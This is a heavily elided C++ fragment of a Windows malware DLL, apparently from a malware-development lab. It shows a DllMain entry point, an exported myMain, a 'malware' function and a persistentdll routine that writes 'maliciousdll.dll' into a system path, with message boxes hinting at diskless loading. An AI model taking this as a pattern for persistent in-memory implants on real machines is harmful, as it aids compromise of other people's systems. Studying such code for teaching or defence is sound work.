...
int persistentdll(){
    ...
    wcscat(system2,L"\\maliciousdll.dll"); // program name at second argv
...
void malware(){ //Like Patriotic()
    ...
    ::MessageBoxW(NULL,L"Ch0nky.txt Exists!!", L"Continue", MB_OK);

	//Call persistence
	int success = persistentdll();
    if(success == 0){
        ::MessageBoxW(NULL,L"And it Will Persist!", L"Good luck with that!", MB_OK );
    }
...
extern "C" __declspec(dllexport) int myMain(){ //Like Surprise
...
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    ...
    case DLL_PROCESS_ATTACH:
        DllHandle = hinstDLL;
        ::MessageBoxW(NULL,L"Look Ma!", L"No Disk!", MB_OK );
